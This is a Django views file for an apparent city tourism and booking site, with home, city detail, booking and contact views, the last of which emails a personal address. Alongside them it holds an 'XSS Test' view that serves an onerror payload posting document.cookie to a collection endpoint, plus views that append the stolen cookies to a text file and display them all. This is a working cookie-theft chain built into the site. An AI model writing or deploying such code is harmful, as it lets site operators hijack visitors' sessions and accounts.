from django.shortcuts import render, get_object_or_404
from .models import City
from django.http import HttpResponse
import os

# الصفحة الرئيسية
def home(request):
    cities = City.objects.all()[:6]
    return render(request, 'home.html', {'cities': cities})

# تفاصيل مدينة
def city_detail(request, city_id):
    city = get_object_or_404(City, pk=city_id)
    images = city.gallery.all()
    return render(request, 'city_detail.html', {'city': city, 'images': images})

# صفحة الحجز
def booking(request):
    return render(request, 'booking.html')

# صفحة التواصل
from django.core.mail import send_mail
from .models import ContactMessage

def contact(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        message = request.POST.get('message')

        ContactMessage.objects.create(name=name, email=email, message=message)

        send_mail(
            subject=f'New Contact Message from {name}',
            message=message,
            from_email=email,
            recipient_list=['oboulechfar1@gmail.com'],
            fail_silently=False,
        )

        return render(request, 'contact.html', {'success': True})

    return render(request, 'contact.html')

# صفحة XSS
def xss_test(request):
    return HttpResponse("""
        <html>
        <body>
        <h1>XSS Test</h1>
        <img src="x" onerror="fetch('/collect/?cookie='+document.cookie)">
        </body>
        </html>
    """)

# استقبال الكوكيز وتخزينها
def receive_cookie(request):
    cookie = request.GET.get("cookie", "")
    if cookie:
        with open("cookies.txt", "a") as f:
            f.write(cookie + "\n")
    return HttpResponse("Cookie received")

# عرض الكوكيز المخزنة
def view_cookies(request):
    if os.path.exists("cookies.txt"):
        with open("cookies.txt", "r") as f:
            content = f.read()
    else:
        content = "No cookies stored yet."
    return HttpResponse(f"<pre>{content}</pre>")
